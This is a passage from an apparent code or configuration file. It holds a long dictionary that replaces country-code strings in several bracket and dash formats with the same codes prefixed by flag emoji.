        " TL ": " 🇹🇱 TL ",
        " TG ": " 🇹🇬 TG ",
        " TK ": " 🇹🇰 TK ",
        " MG ": " 🇲🇬 MG ",
        " MW ": " 🇲🇼 MW ",
        " MY ": " 🇲🇾 MY ",
        " MV ": " 🇲🇻 MV ",
        " ML ": " 🇲🇱 ML ",
        " MT ": " 🇲🇹 MT ",
        " MH ": " 🇲🇭 MH ",
        " MQ ": " 🇲🇶 MQ ",
        " MR ": " 🇲🇷 MR ",
        " MU ": " 🇲🇺 MU ",
        " YT ": " 🇾🇹 YT ",
        " MX ": " 🇲🇽 MX ",
        " FM ": " 🇫🇲 FM ",
        " MD ": " 🇲🇩 MD ",
        " MC ": " 🇲🇨 MC ",
        " MN ": " 🇲🇳 MN ",
        " ME ": " 🇲🇪 ME ",
        " MS ": " 🇲🇸 MS ",
        " MA ": " 🇲🇦 MA ",
        " MZ ": " 🇲🇿 MZ ",
        " MM ": " 🇲🇲 MM ",
        " NA ": " 🇳🇦 NA ",
        " NR ": " 🇳🇷 NR ",
        " NP ": " 🇳🇵 NP ",
        " NL ": " 🇳🇱 NL ",
        " NC ": " 🇳🇨 NC ",
        " NZ ": " 🇳🇿 NZ ",
        " NI ": " 🇳🇮 NI ",
        " NE ": " 🇳🇪 NE ",
        " NG ": " 🇳🇬 NG ",
        " NU ": " 🇳🇺 NU ",
        " NF ": " 🇳🇫 NF ",
        " MP ": " 🇲🇵 MP ",
        " NO ": " 🇳🇴 NO ",
        " OM ": " 🇴🇲 OM ",
        " PK ": " 🇵🇰 PK ",
        " PW ": " 🇵🇼 PW ",
        " PS ": " 🇵🇸 PS ",
        " PA ": " 🇵🇦 PA ",
        " PG ": " 🇵🇬 PG ",
        " PY ": " 🇵🇾 PY ",
        " PE ": " 🇵🇪 PE ",
        " PH ": " 🇵🇭 PH ",
        " PN ": " 🇵🇳 PN ",
        " PL ": " 🇵🇱 PL ",
        " PT ": " 🇵🇹 PT ",
        " PR ": " 🇵🇷 PR ",
        " QA ": " 🇶🇦 QA ",
        " RE ": " 🇷🇪 RE ",
        " RO ": " 🇷🇴 RO ",
        " RUS ": " 🇷🇺 RUS ",
        " RW ": " 🇷🇼 RW ",
        " BL ": " 🇧🇱 BL ",
        " SH ": " 🇸🇭 SH ",
        " KN ": " 🇰🇳 KN ",
        " LC ": " 🇱🇨 LC ",
        " MF ": " 🇲🇫 MF ",
        " PM ": " 🇵🇲 PM ",
        " VC ": " 🇻🇨 VC ",
        " WS ": " 🇼🇸 WS ",
        " SM ": " 🇸🇲 SM ",
        " ST ": " 🇸🇹 ST ",
        " SA ": " 🇸🇦 SA ",
        " SN ": " 🇸🇳 SN ",
        " RS ": " 🇷🇸 RS ",
        " SC ": " 🇸🇨 SC ",
        " SL ": " 🇸🇱 SL ",
        " SG ": " 🇸🇬 SG ",
        " SX ": " 🇸🇽 SX ",
        " SK ": " 🇸🇰 SK ",
        " SI ": " 🇸🇮 SI ",
        " SB ": " 🇸🇧 SB ",
        " SO ": " 🇸🇴 SO ",
        " ZA ": " 🇿🇦 ZA ",
        " GS ": " 🇬🇸 GS ",
        " SS ": " 🇸🇸 SS ",
        " ES ": " 🇪🇸 ES ",
        " LK ": " 🇱🇰 LK ",
        " SD ": " 🇸🇩 SD ",
        " SR ": " 🇸🇷 SR ",
        " SJ ": " 🇸🇯 SJ ",
        " SZ ": " 🇸🇿 SZ ",
        " SE ": " 🇸🇪 SE ",
        " CH ": " 🇨🇭 CH ",
        " SY ": " 🇸🇾 SY ",
        " TW ": " 🇹🇼 TW ",
        " TJ ": " 🇹🇯 TJ ",
        " TZ ": " 🇹🇿 TZ ",
        " TH ": " 🇹🇭 TH ",
        " TT ": " 🇹🇹 TT ",
        " TN ": " 🇹🇳 TN ",
        " TR ": " 🇹🇷 TR ",
        " TM ": " 🇹🇲 TM ",
        " TC ": " 🇹🇨 TC ",
        " UG ": " 🇺🇬 UG ",
        " UA ": " 🇺🇦 UA ",
        " AE ": " 🇦🇪 AE ",
        " GB ": " 🇬🇧 GB ",
        " USA ": " 🇺🇸 USA ",
        " UM ": " 🇺🇲 UM ",
        " UY ": " 🇺🇾 UY ",
        " UZ ": " 🇺🇿 UZ ",
        " VU ": " 🇻🇺 VU ",
        " VE ": " 🇻🇪 VE ",
        " VN ": " 🇻🇳 VN ",
        " VI ": " 🇻🇮 VI ",
        " WF ": " 🇼🇫 WF ",
        " EH ": " 🇪🇭 EH ",
        " YE ": " 🇾🇪 YE ",
        " ZM ": " 🇿🇲 ZM ",
        " ZW ": " 🇿🇼 ZW ",
        " ROU ": " 🇷🇴 ROU ",
        " SRB ": " 🇷🇸 SRB ",
        " HRV ": " 🇭🇷 HRV ",
        " BIH ": " 🇧🇦 BIH ",
        " UKA ": " 🇺🇦 UKA ",
        " UK-": " 🇬🇧 UK ",
        " US-": " 🇺🇸 US ",
        " DE-": " 🇩🇪 DE ",
        " AU-": " 🇦🇺 AU ",
        " AFG-": " 🇦🇫 AFG ",
        " AX-": " 🇦🇽 AX ",
        " ALB-": " 🇦🇱 ALB ",
        " AL-": " 🇦🇱 AL ",
        " DZ-": " 🇩🇿 DZ ",
        " AS-": " 🇦🇸 AS ",
        " AD-": " 🇦🇩 AD ",
        " AO-": " 🇦🇴 AO ",
        " AI-": " 🇦🇮 AI ",
        " AQ-": " 🇦🇶 AQ ",
        " AG-": " 🇦🇬 AG ",
        " AR-": " 🇦🇪 AR ",
        " AM-": " 🇦🇲 AM ",
        " AW-": " 🇦🇼 AW ",
        " AT-": " 🇦🇹 AT ",
        " AZ-": " 🇦🇿 AZ ",
        " KU-": " 🇰🇷 KU ",
        " BS-": " 🇧🇸 BS ",
        " BH-": " 🇧🇭 BH ",
        " BD-": " 🇧🇩 BD ",
        " BB-": " 🇧🇧 BB ",
        " BY-": " 🇧🇾 BY ",
        " BE-": " 🇧🇪 BE ",
        " BZ-": " 🇧🇿 BZ ",
        " BJ-": " 🇧🇯 BJ ",
        " BM-": " 🇧🇲 BM ",
        " BT-": " 🇧🇹 BT ",
        " BO-": " 🇧🇴 BO ",
        " BA-": " 🇧🇦 BA ",
        " BW-": " 🇧🇼 BW ",
        " BV-": " 🇧🇻 BV ",
        " BR-": " 🇧🇷 BR ",
        " IO-": " 🇮🇴 IO ",
        " BN-": " 🇧🇳 BN ",
        " BG-": " 🇧🇬 BG ",
        " BF-": " 🇧🇫 BF ",
        " BI-": " 🇧🇮 BI ",
        " KH-": " 🇰🇭 KH ",
        " CM-": " 🇨🇲 CM ",
        " CA-": " 🇨🇦 CA ",
        " CV-": " 🇨🇻 CV ",
        " KY-": " 🇰🇾 KY ",
        " CF-": " 🇨🇫 CF ",
        " TD-": " 🇹🇩 TD ",
        " CL-": " 🇨🇱 CL ",
        " CN-": " 🇨🇳 CN ",
        " CX-": " 🇨🇽 CX ",
        " CC-": " 🇨🇨 CC ",
        " CO-": " 🇨🇴 CO ",
        " KM-": " 🇰🇲 KM ",
        " CG-": " 🇨🇬 CG ",
        " CD-": " 🇨🇩 CD ",
        " CK-": " 🇨🇰 CK ",
        " CR-": " 🇨🇷 CR ",
        " CI-": " 🇨🇮 CI ",
        " HR-": " 🇭🇷 HR ",
        " CU-": " 🇨🇺 CU ",
        " CY-": " 🇨🇾 CY ",
        " CZ-": " 🇨🇿 CZ ",
        " DK-": " 🇩🇰 DK ",
        " DJ-": " 🇩🇯 DJ ",
        " DM-": " 🇩🇲 DM ",
        " DO-": " 🇩🇴 DO ",
        " EZ-": " 🇪🇨 EZ ",
        " EG-": " 🇪🇬 EG ",
        " SV-": " 🇸🇻 SV ",
        " GQ-": " 🇬🇶 GQ ",
        " ER-": " 🇪🇷 ER ",
        " EE-": " 🇪🇪 EE ",
        " ET-": " 🇪🇹 ET ",
        " FK-": " 🇫🇰 FK ",
        " FO-": " 🇫🇴 FO ",
        " FJ-": " 🇫🇯 FJ ",
        " FI-": " 🇫🇮 FI ",
        " FR-": " 🇫🇷 FR ",
        " GF-": " 🇬🇫 GF ",
        " PF-": " 🇵🇫 PF ",
        " TF-": " 🇹🇫 TF ",
        " GA-": " 🇬🇦 GA ",
        " GM-": " 🇬🇲 GM ",
        " GE-": " 🇬🇪 GE ",
        " GH-": " 🇬🇭 GH ",
        " GI-": " 🇬🇮 GI ",
        " GR-": " 🇬🇷 GR ",
        " GL-": " 🇬🇱 GL ",
        " GD-": " 🇬🇵 GP ",
        " GU-": " 🇬🇺 GU ",
        " GT-": " 🇬🇹 GT ",
        " GG-": " 🇬🇬 GG ",
        " GN-": " 🇬🇳 GN ",
        " GW-": " 🇬🇼 GW ",
        " GY-": " 🇬🇾 GY ",
        " HT-": " 🇭🇹 HT ",
        " HM-": " 🇭🇲 HM ",
        " VA-": " 🇻🇦 VA ",
        " HN-": " 🇭🇳 HN ",
        " HK-": " 🇭🇰 HK ",
        " HU-": " 🇭🇺 HU ",
        " IS-": " 🇮🇸 IS ",
        " IN-": " 🇮🇳 IN ",
        " ID-": " 🇮🇩 ID ",
        " IR-": " 🇮🇷 IR ",
        " IQ-": " 🇮🇶 IQ ",
        " IE-": " 🇮🇪 IE ",
        " IM-": " 🇮🇲 IM ",
        " IL-": " 🇮🇱 IL ",
        " IT-": " 🇮🇹 IT ",
        " JM-": " 🇯🇲 JM ",
        " JP-": " 🇯🇵 JP ",
        " JE-": " 🇯🇪 JE ",
        " JO-": " 🇯🇴 JO ",
        " KZ-": " 🇰🇿 KZ ",
        " KE-": " 🇰🇪 KE ",
        " KI-": " 🇰🇮 KI ",
        " KP-": " 🇰🇵 KP ",
        " KR-": " 🇰🇷 KR ",
        " KW-": " 🇰🇼 KW ",
        " KG-": " 🇰🇬 KG ",
        " TO-": " 🇹🇴 TO ",
        " LA-": " 🇱🇦 LA ",
        " LV-": " 🇱🇻 LV ",
        " LB-": " 🇱🇧 LB ",
        " LS-": " 🇱🇸 LS ",
        " LR-": " 🇱🇷 LR ",
        " LY-": " 🇱🇾 LY ",
        " LI-": " 🇱🇮 LI ",
        " TL-": " 🇹🇱 TL ",
        " TG-": " 🇹🇬 TG ",
        " TK-": " 🇹🇰 TK ",
        " MG-": " 🇲🇬 MG ",
        " MW-": " 🇲🇼 MW ",
        " MY-": " 🇲🇾 MY ",
        " MV-": " 🇲🇻 MV ",
        " ML-": " 🇲🇱 ML ",
        " MT-": " 🇲🇹 MT ",
        " MH-": " 🇲🇭 MH ",
        " MQ-": " 🇲🇶 MQ ",
        " MR-": " 🇲🇷 MR ",
        " MU-": " 🇲🇺 MU ",
        " YT-": " 🇾🇹 YT ",
        " MX-": " 🇲🇽 MX ",
        " FM-": " 🇫🇲 FM ",
        " MD-": " 🇲🇩 MD ",
        " MC-": " 🇲🇨 MC ",
        " MN-": " 🇲🇳 MN ",
        " ME-": " 🇲🇪 ME ",
        " MS-": " 🇲🇸 MS ",
        " MA-": " 🇲🇦 MA ",
        " MZ-": " 🇲🇿 MZ ",
        " MM-": " 🇲🇲 MM ",
        " NA-": " 🇳🇦 NA ",
        " NR-": " 🇳🇷 NR ",
        " NP-": " 🇳🇵 NP ",
        " NL-": " 🇳🇱 NL ",
        " NC-": " 🇳🇨 NC ",
        " NZ-": " 🇳🇿 NZ ",
        " NI-": " 🇳🇮 NI ",
        " NE-": " 🇳🇪 NE ",
        " NG-": " 🇳🇬 NG ",
        " NU-": " 🇳🇺 NU ",
        " NF-": " 🇳🇫 NF ",
        " MP-": " 🇲🇵 MP ",
        " NO-": " 🇳🇴 NO ",
        " OM-": " 🇴🇲 OM ",
        " PK-": " 🇵🇰 PK ",
        " PW-": " 🇵🇼 PW ",
        " PS-": " 🇵🇸 PS ",
        " PA-": " 🇵🇦 PA ",
        " PG-": " 🇵🇬 PG ",
        " PY-": " 🇵🇾 PY ",
        " PE-": " 🇵🇪 PE ",
        " PH-": " 🇵🇭 PH ",
        " PN-": " 🇵🇳 PN ",
        " PL-": " 🇵🇱 PL ",
        " PT-": " 🇵🇹 PT ",
        " PR-": " 🇵🇷 PR ",
        " QA-": " 🇶🇦 QA ",
        " RE-": " 🇷🇪 RE ",
        " RO-": " 🇷🇴 RO ",
        " RUS-": " 🇷🇺 RUS ",
        " RW-": " 🇷🇼 RW ",
        " BL-": " 🇧🇱 BL ",
        " SH-": " 🇸🇭 SH ",
        " KN-": " 🇰🇳 KN ",
        " LC-": " 🇱🇨 LC ",
        " MF-": " 🇲🇫 MF ",
        " PM-": " 🇵🇲 PM ",
        " VC-": " 🇻🇨 VC ",
        " WS-": " 🇼🇸 WS ",
        " SM-": " 🇸🇲 SM ",
        " ST-": " 🇸🇹 ST ",
        " SA-": " 🇸🇦 SA ",
        " SN-": " 🇸🇳 SN ",
        " RS-": " 🇷🇸 RS ",
        " SC-": " 🇸🇨 SC ",
        " SL-": " 🇸🇱 SL ",
        " SG-": " 🇸🇬 SG ",
        " SX-": " 🇸🇽 SX ",
        " SK-": " 🇸🇰 SK ",
        " SI-": " 🇸🇮 SI ",
        " SB-": " 🇸🇧 SB ",
        " SO-": " 🇸🇴 SO ",
        " ZA-": " 🇿🇦 ZA ",
        " GS-": " 🇬🇸 GS ",
        " SS-": " 🇸🇸 SS ",
        " ES-": " 🇪🇸 ES ",
        " LK-": " 🇱🇰 LK ",
        " SD-": " 🇸🇩 SD ",
        " SR-": " 🇸🇷 SR ",
        " SJ-": " 🇸🇯 SJ ",
        " SZ-": " 🇸🇿 SZ ",
        " SE-": " 🇸🇪 SE ",
        " CH-": " 🇨🇭 CH ",
        " SY-": " 🇸🇾 SY ",
        " TW-": " 🇹🇼 TW ",
        " TJ-": " 🇹🇯 TJ ",
        " TZ-": " 🇹🇿 TZ ",
        " TH-": " 🇹🇭 TH ",
        " TT-": " 🇹🇹 TT ",
        " TN-": " 🇹🇳 TN ",
        " TR-": " 🇹🇷 TR ",
        " TM-": " 🇹🇲 TM ",
        " TC-": " 🇹🇨 TC ",
        " UG-": " 🇺🇬 UG ",
        " UA-": " 🇺🇦 UA ",
        " AE-": " 🇦🇪 AE ",
        " GB-": " 🇬🇧 GB ",
        " USA-": " 🇺🇸 USA ",
        " UM-": " 🇺🇲 UM ",
        " UY-": " 🇺🇾 UY ",
        " UZ-": " 🇺🇿 UZ ",
        " VU-": " 🇻🇺 VU ",
        " VE-": " 🇻🇪 VE ",
        " VN-": " 🇻🇳 VN ",
        " VI-": " 🇻🇮 VI ",
        " WF-": " 🇼🇫 WF ",
        " EH-": " 🇪🇭 EH ",
        " YE-": " 🇾🇪 YE ",
        " ZM-": " 🇿🇲 ZM ",
        " ZW-": " 🇿🇼 ZW ",
        " ROU-": " 🇷🇴 ROU ",
        " SRB-": " 🇷🇸 SRB ",
        " HRV-": " 🇭🇷 HRV ",
        " BIH-": " 🇧🇦 BIH ",
        " UKA-": " 🇺🇦 UKA ",
        "(AU)": " 🇦🇺 AU ",
        "(KU)": " 🇰🇷 KU ",
        "(UK)": " 🇬🇧 UK ",
        "(US)": " 🇺🇸 US ",
        "(DE)": " 🇩🇪 DE ",
        "(AFG)": " 🇦🇫 AFG ",
        "(AX)": " 🇦🇽 AX ",
        "(ALB)": " 🇦🇱 ALB ",
        "(AL)": "(🇦🇱 AL ",
        "(DZ)": " 🇩🇿 DZ ",
        "(AS)": " 🇦🇸 AS ",
        "(AD)": " 🇦🇩 AD ",
        "(AO)": " 🇦🇴 AO ",
        "(AI)": " 🇦🇮 AI ",
        "(AQ)": " 🇦🇶 AQ ",
        "(AG)": " 🇦🇬 AG ",
        "(AR)": " 🇦🇪 AR ",
        "(AM)": " 🇦🇲 AM ",
        "(AW)": " 🇦🇼 AW ",
        "(AT)": " 🇦🇹 AT ",
        "(AZ)": " 🇦🇿 AZ ",
        "(BS)": " 🇧🇸 BS ",
        "(BH)": " 🇧🇭 BH ",
        "(BD)": " 🇧🇩 BD ",
        "(BB)": " 🇧🇧 BB ",
        "(BY)": " 🇧🇾 BY ",
        "(BE)": " 🇧🇪 BE ",
        "(BZ)": " 🇧🇿 BZ ",
        "(BJ)": " 🇧🇯 BJ ",
        "(BM)": " 🇧🇲 BM ",
        "(BT)": " 🇧🇹 BT ",
        "(BO)": " 🇧🇴 BO ",
        "(BA)": " 🇧🇦 BA ",
        "(BW)": " 🇧🇼 BW ",
        "(BV)": " 🇧🇻 BV ",
        "(BR)": " 🇧🇷 BR ",
        "(IO)": " 🇮🇴 IO ",
        "(BN)": " 🇧🇳 BN ",
        "(BG)": " 🇧🇬 BG ",
        "(BF)": " 🇧🇫 BF ",
        "(BI)": " 🇧🇮 BI ",
        "(KH)": " 🇰🇭 KH ",
        "(CM)": " 🇨🇲 CM ",
        "(CA)": " 🇨🇦 CA ",
        "(CV)": " 🇨🇻 CV ",
        "(KY)": " 🇰🇾 KY ",
        "(CF)": " 🇨🇫 CF ",
        "(TD)": " 🇹🇩 TD ",
        "(CL)": " 🇨🇱 CL ",
        "(CN)": " 🇨🇳 CN ",
        "(CX)": " 🇨🇽 CX ",
        "(CC)": " 🇨🇨 CC ",
        "(CO)": " 🇨🇴 CO ",
        "(KM)": " 🇰🇲 KM ",
        "(CG)": " 🇨🇬 CG ",
        "(CD)": " 🇨🇩 CD ",
        "(CK)": " 🇨🇰 CK ",
        "(CR)": " 🇨🇷 CR ",
        "(CI)": " 🇨🇮 CI ",
        "(HR)": " 🇭🇷 HR ",
        "(CU)": " 🇨🇺 CU ",
        "(CY)": " 🇨🇾 CY ",
        "(CZ)": " 🇨🇿 CZ ",
        "(DK)": " 🇩🇰 DK ",
        "(DJ)": " 🇩🇯 DJ ",
        "(DM)": " 🇩🇲 DM ",
        "(DO)": " 🇩🇴 DO ",
        "(EZ)": " 🇪🇨 EZ ",
        "(EG)": " 🇪🇬 EG ",
        "(SV)": " 🇸🇻 SV ",
        "(GQ)": " 🇬🇶 GQ ",
        "(ER)": " 🇪🇷 ER ",
        "(EE)": " 🇪🇪 EE ",
        "(ET)": " 🇪🇹 ET ",
        "(FK)": " 🇫🇰 FK ",
        "(FO)": " 🇫🇴 FO ",
        "(FJ)": " 🇫🇯 FJ ",
        "(FI)": " 🇫🇮 FI ",
        "(FR)": " 🇫🇷 FR ",
        "(GF)": " 🇬🇫 GF ",
        "(PF)": " 🇵🇫 PF ",
        "(TF)": " 🇹🇫 TF ",
        "(GA)": " 🇬🇦 GA ",
        "(GM)": " 🇬🇲 GM ",
        "(GE)": " 🇬🇪 GE ",
        "(GH)": " 🇬🇭 GH ",
        "(GI)": " 🇬🇮 GI ",
        "(GR)": " 🇬🇷 GR ",
        "(GL)": " 🇬🇱 GL ",
        "(GD)": " 🇬🇵 GP ",
        "(GU)": " 🇬🇺 GU ",
        "(GT)": " 🇬🇹 GT ",
        "(GG)": " 🇬🇬 GG ",
        "(GN)": " 🇬🇳 GN ",
        "(GW)": " 🇬🇼 GW ",
        "(GY)": " 🇬🇾 GY ",
        "(HT)": " 🇭🇹 HT ",
        "(HM)": " 🇭🇲 HM ",
        "(VA)": " 🇻🇦 VA ",
        "(HN)": " 🇭🇳 HN ",
        "(HK)": " 🇭🇰 HK ",
        "(HU)": " 🇭🇺 HU ",
        "(IS)": " 🇮🇸 IS ",
        "(IN)": " 🇮🇳 IN ",
        "(ID)": " 🇮🇩 ID ",
        "(IR)": " 🇮🇷 IR ",
        "(IQ)": " 🇮🇶 IQ ",
        "(IE)": " 🇮🇪 IE ",
        "(IM)": " 🇮🇲 IM ",
        "(IL)": " 🇮🇱 IL ",
        "(IT)": " 🇮🇹 IT ",
        "(JM)": " 🇯🇲 JM ",
        "(JP)": " 🇯🇵 JP ",
        "(JE)": " 🇯🇪 JE ",
        "(JO)": " 🇯🇴 JO ",
        "(KZ)": " 🇰🇿 KZ ",
        "(KE)": " 🇰🇪 KE ",
        "(KI)": " 🇰🇮 KI ",
        "(KP)": " 🇰🇵 KP ",
        "(KR)": " 🇰🇷 KR ",
        "(KW)": " 🇰🇼 KW ",
        "(KG)": " 🇰🇬 KG ",
        "(TO)": " 🇹🇴 TO ",
        "(LA)": " 🇱🇦 LA ",
        "(LV)": " 🇱🇻 LV ",
        "(LB)": " 🇱🇧 LB ",
        "(LS)": " 🇱🇸 LS ",
        "(LR)": " 🇱🇷 LR ",
        "(LY)": " 🇱🇾 LY ",
        "(LI)": " 🇱🇮 LI ",
        "(TL)": " 🇹🇱 TL ",
        "(TG)": " 🇹🇬 TG ",
        "(TK)": " 🇹🇰 TK ",
        "(MG)": " 🇲🇬 MG ",
        "(MW)": " 🇲🇼 MW ",
        "(MY)": " 🇲🇾 MY ",
        "(MV)": " 🇲🇻 MV ",
        "(ML)": " 🇲🇱 ML ",
        "(MT)": " 🇲🇹 MT ",
        "(MH)": " 🇲🇭 MH ",
        "(MQ)": " 🇲🇶 MQ ",
        "(MR)": " 🇲🇷 MR ",
        "(MU)": " 🇲🇺 MU ",
        "(YT)": " 🇾🇹 YT ",
        "(MX)": " 🇲🇽 MX ",
        "(FM)": " 🇫🇲 FM ",
        "(MD)": " 🇲🇩 MD ",
        "(MC)": " 🇲🇨 MC ",
        "(MN)": " 🇲🇳 MN ",
        "(ME)": " 🇲🇪 ME ",
        "(MS)": " 🇲🇸 MS ",
        "(MA)": " 🇲🇦 MA ",
        "(MZ)": " 🇲🇿 MZ ",
        "(MM)": " 🇲🇲 MM ",
        "(NA)": " 🇳🇦 NA ",
        "(NR)": " 🇳🇷 NR ",
        "(NP)": " 🇳🇵 NP ",
        "(NL)": " 🇳🇱 NL ",
        "(NC)": " 🇳🇨 NC ",
        "(NZ)": " 🇳🇿 NZ ",
        "(NI)": " 🇳🇮 NI ",
        "(NE)": " 🇳🇪 NE ",
        "(NG)": " 🇳🇬 NG ",
        "(NU)": " 🇳🇺 NU ",
        "(NF)": " 🇳🇫 NF ",
        "(MP)": " 🇲🇵 MP ",
        "(NO)": " 🇳🇴 NO ",
        "(OM)": " 🇴🇲 OM ",
        "(PK)": " 🇵🇰 PK ",
        "(PW)": " 🇵🇼 PW ",
        "(PS)": " 🇵🇸 PS ",
        "(PA)": " 🇵🇦 PA ",
        "(PG)": " 🇵🇬 PG ",
        "(PY)": " 🇵🇾 PY ",
        "(PE)": " 🇵🇪 PE ",
        "(PH)": " 🇵🇭 PH ",
        "(PN)": " 🇵🇳 PN ",
        "(PL)": " 🇵🇱 PL ",
        "(PT)": " 🇵🇹 PT ",
        "(PR)": " 🇵🇷 PR ",
        "(QA)": " 🇶🇦 QA ",
        "(RE)": " 🇷🇪 RE ",
        "(RO)": " 🇷🇴 RO ",
        "(RUS)": " 🇷🇺 RUS ",
        "(RW)": " 🇷🇼 RW ",
        "(BL)": " 🇧🇱 BL ",
        "(SH)": " 🇸🇭 SH ",
        "(KN)": " 🇰🇳 KN ",
        "(LC)": " 🇱🇨 LC ",
        "(MF)": " 🇲🇫 MF ",
        "(PM)": " 🇵🇲 PM ",
        "(VC)": " 🇻🇨 VC ",
        "(WS)": " 🇼🇸 WS ",
        "(SM)": " 🇸🇲 SM ",
        "(ST)": " 🇸🇹 ST ",
        "(SA)": " 🇸🇦 SA ",
        "(SN)": " 🇸🇳 SN ",
        "(RS)": " 🇷🇸 RS ",
        "(SC)": " 🇸🇨 SC ",
        "(SL)": " 🇸🇱 SL ",
        "(SG)": " 🇸🇬 SG ",
        "(SX)": " 🇸🇽 SX ",
        "(SK)": " 🇸🇰 SK ",
        "(SI)": " 🇸🇮 SI ",
        "(SB)": " 🇸🇧 SB ",
        "(SO)": " 🇸🇴 SO ",
        "(ZA)": " 🇿🇦 ZA ",
        "(GS)": " 🇬🇸 GS ",
        "(SS)": " 🇸🇸 SS ",
        "(ES)": " 🇪🇸 ES ",
        "(LK)": " 🇱🇰 LK ",
        "(SD)": " 🇸🇩 SD ",
        "(SR)": " 🇸🇷 SR ",
        "(SJ)": " 🇸🇯 SJ ",
        "(SZ)": " 🇸🇿 SZ ",
        "(SE)": " 🇸🇪 SE ",
        "(CH)": " 🇨🇭 CH ",
        "(SY)": " 🇸🇾 SY ",
        "(TW)": " 🇹🇼 TW ",
        "(TJ)": " 🇹🇯 TJ ",
        "(TZ)": " 🇹🇿 TZ ",
        "(TH)": " 🇹🇭 TH ",
        "(TT)": " 🇹🇹 TT ",
        "(TN)": " 🇹🇳 TN ",
        "(TR)": " 🇹🇷 TR ",
        "(TM)": " 🇹🇲 TM ",
        "(TC)": " 🇹🇨 TC ",
        "(UG)": " 🇺🇬 UG ",
        "(UA)": " 🇺🇦 UA ",
        "(AE)": " 🇦🇪 AE ",
        "(GB)": " 🇬🇧 GB ",
        "(USA)": " 🇺🇸 USA ",
        "(UM)": " 🇺🇲 UM ",
        "(UY)": " 🇺🇾 UY ",
        "(UZ)": " 🇺🇿 UZ ",
        "(VU)": " 🇻🇺 VU ",
        "(VE)": " 🇻🇪 VE ",
        "(VN)": " 🇻🇳 VN ",
        "(VI)": " 🇻🇮 VI ",
        "(WF)": " 🇼🇫 WF ",
        "(EH)": " 🇪🇭 EH ",
        "(YE)": " 🇾🇪 YE ",
        "(ZM)": " 🇿🇲 ZM ",
        "(ZW)": " 🇿🇼 ZW ",
        "(ROU)": " 🇷🇴 ROU ",
        "(SRB)": " 🇷🇸 SRB ",
        "(HRV)": " 🇭🇷 HRV ",
        "(BIH)": " 🇧🇦 BIH ",
        "(UKA)": " 🇺🇦 UKA ",
        " AU)": " 🇦🇺 AU ",
        " KU)": " 🇰🇷 KU ",
        " UK)": " 🇬🇧 UK ",
        " US)": " 🇺🇸 US ",
        " DE)": " 🇩🇪 DE ",
        " AFG)": " 🇦🇫 AFG ",
        " AX)": " 🇦🇽 AX ",
        " ALB)": " 🇦🇱 ALB ",
        " AL)": " 🇦🇱 AL ",
        " DZ)": " 🇩🇿 DZ ",
        " AS)": " 🇦🇸 AS ",
        " AD)": " 🇦🇩 AD ",
        " AO)": " 🇦🇴 AO ",
        " AI)": " 🇦🇮 AI ",
        " AQ)": " 🇦🇶 AQ ",
        " AG)": " 🇦🇬 AG ",
        " AR)": " 🇦🇪 AR ",
        " AM)": " 🇦🇲 AM ",
        " AW)": " 🇦🇼 AW ",
        " AT)": " 🇦🇹 AT ",
        " AZ)": " 🇦🇿 AZ ",
        " BS)": " 🇧🇸 BS ",
        " BH)": " 🇧🇭 BH ",
        " BD)": " 🇧🇩 BD ",
        " BB)": " 🇧🇧 BB ",
        " BY)": " 🇧🇾 BY ",
        " BE)": " 🇧🇪 BE ",
        " BZ)": " 🇧🇿 BZ ",
        " BJ)": " 🇧🇯 BJ ",
        " BM)": " 🇧🇲 BM ",
        " BT)": " 🇧🇹 BT ",
        " BO)": " 🇧🇴 BO ",
        " BA)": " 🇧🇦 BA ",
        " BW)": " 🇧🇼 BW ",
        " BV)": " 🇧🇻 BV ",
        " BR)": " 🇧🇷 BR ",
        " IO)": " 🇮🇴 IO ",
        " BN)": " 🇧🇳 BN ",
        " BG)": " 🇧🇬 BG ",
        " BF)": " 🇧🇫 BF ",
        " BI)": " 🇧🇮 BI ",
        " KH)": " 🇰🇭 KH ",
        " CM)": " 🇨🇲 CM ",
        " CA)": " 🇨🇦 CA ",
        " CV)": " 🇨🇻 CV ",
        " KY)": " 🇰🇾 KY ",
        " CF)": " 🇨🇫 CF ",
        " TD)": " 🇹🇩 TD ",
        " CL)": " 🇨🇱 CL ",
        " CN)": " 🇨🇳 CN ",
        " CX)": " 🇨🇽 CX ",
        " CC)": " 🇨🇨 CC ",
        " CO)": " 🇨🇴 CO ",
        " KM)": " 🇰🇲 KM ",
        " CG)": " 🇨🇬 CG ",
        " CD)": " 🇨🇩 CD ",
        " CK)": " 🇨🇰 CK ",
        " CR)": " 🇨🇷 CR ",
        " CI)": " 🇨🇮 CI ",
        " HR)": " 🇭🇷 HR ",
        " CU)": " 🇨🇺 CU ",
        " CY)": " 🇨🇾 CY ",
        " CZ)": " 🇨🇿 CZ ",
        " DK)": " 🇩🇰 DK ",
        " DJ)": " 🇩🇯 DJ ",
        " DM)": " 🇩🇲 DM ",
        " DO)": " 🇩🇴 DO ",
        " EZ)": " 🇪🇨 EZ ",
        " EG)": " 🇪🇬 EG ",
        " SV)": " 🇸🇻 SV ",
        " GQ)": " 🇬🇶 GQ ",
        " ER)": " 🇪🇷 ER ",
        " EE)": " 🇪🇪 EE ",
        " ET)": " 🇪🇹 ET ",
        " FK)": " 🇫🇰 FK ",
        " FO)": " 🇫🇴 FO ",
        " FJ)": " 🇫🇯 FJ ",
        " FI)": " 🇫🇮 FI ",
        " FR)": " 🇫🇷 FR ",
        " GF)": " 🇬🇫 GF ",
        " PF)": " 🇵🇫 PF ",
        " TF)": " 🇹🇫 TF ",
        " GA)": " 🇬🇦 GA ",
        " GM)": " 🇬🇲 GM ",
        " GE)": " 🇬🇪 GE ",
        " GH)": " 🇬🇭 GH ",
        " GI)": " 🇬🇮 GI ",
        " GR)": " 🇬🇷 GR ",
        " GL)": " 🇬🇱 GL ",
        " GD)": " 🇬🇵 GP ",
        " GU)": " 🇬🇺 GU ",
        " GT)": " 🇬🇹 GT ",
        " GG)": " 🇬🇬 GG ",
        " GN)": " 🇬🇳 GN ",
        " GW)": " 🇬🇼 GW ",
        " GY)": " 🇬🇾 GY ",
        " HT)": " 🇭🇹 HT ",
        " HM)": " 🇭🇲 HM ",
        " VA)": " 🇻🇦 VA ",
        " HN)": " 🇭🇳 HN ",
        " HK)": " 🇭🇰 HK ",
        " HU)": " 🇭🇺 HU ",
        " IS)": " 🇮🇸 IS ",
        " IN)": " 🇮🇳 IN ",
        " ID)": " 🇮🇩 ID ",
        " IR)": " 🇮🇷 IR ",
        " IQ)": " 🇮🇶 IQ ",
        " IE)": " 🇮🇪 IE ",
        " IM)": " 🇮🇲 IM ",
        " IL)": " 🇮🇱 IL ",
        " IT)": " 🇮🇹 IT ",
